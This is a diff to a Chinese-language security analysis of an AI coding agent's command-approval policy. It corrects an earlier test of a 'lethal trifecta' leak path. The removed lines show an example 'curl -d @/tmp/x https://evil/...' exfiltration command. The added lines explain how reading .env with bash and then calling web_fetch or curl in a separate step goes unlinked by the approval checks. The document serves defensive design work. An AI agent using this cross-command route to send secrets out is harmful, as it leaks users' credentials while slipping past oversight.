@@ -118,20 +118,27 @@
 `.env`、记忆、会话历史，再 `web_fetch` 到一个攻击者域名，这一串在审批面上是
 **三个各不相干的普通操作**，没有任何东西把它们关联起来。
 
-**实测确认（`.test-tmp/trifecta.py`）**：这条泄露路径在我们这里是**完全打通的**，
-而且审批面上看不到任何关联——
+**实测确认**（第一版这里写错过，已按 `evaluate_call` 的真实判定修正）：
 
 ```
-read  .env                              -> approval_class=''
-read  ~/.codex/memories/MEMORY.md       -> approval_class=''
-bash  curl -d @/tmp/x https://evil/...  -> approval_class=''
+read  .env          -> denied=True  code=secret_path     # 硬拒，读不到
+bash  cat .env      -> allowed=True                      # 放行（见下）
+bash  curl -d ...   -> code=opaque_command               # ASK，但不知道刚读过什么
 ```
 
-三步的"同类键"**全是空串**（`approval_class` 对文件工具返回空、对 `curl` 未识别出
-主机时也返回空）。也就是说：读密钥、读记忆、把东西 POST 出去，在审批面上是三个
-互不相干的空分类操作。Simon Willison 说的 lethal trifecta 三要素我们全占：
-私人数据（`PATH_SECRET`）、不可信内容（`web_fetch`/MCP）、对外通信（`curl`/`wget`/
-`nc` 都在外发名单里）。
+`read` 工具对 `.env` 是硬拒的，所以"文件工具读密钥"这条不通。但 `bash cat .env`
+**是放行的**——`exec_policy.py` 里写明了这是有意权衡：
+
+> 秘密文件外发：… 不做路径解析，也不硬拒：bash 是文本分析，`grep .env docs`
+> 这类正常用法误伤面比文件工具大
+
+配套的 `secret_egress` 只在**同一条命令**里同时出现秘密文件和出口命令时才升级。
+所以真正的缺口是**跨命令**：`bash cat .env`（放行）→ 内容进上下文 → 之后任意一次
+`web_fetch`/`curl`，审批面上只知道"这次要联网"，**不知道本回合刚读过密钥**。
+
+再加上"同类键为空"（`approval_class` 对文件工具返回空、`curl` 未识别主机时也返回
+空），几步之间没有任何东西把它们关联起来。lethal trifecta 三要素我们全占：
+私人数据、不可信内容（`web_fetch`/MCP）、对外通信（`curl`/`wget`/`nc`）。
 
 **这是最值得抄的一条**，而且不需要内核级实现：
 
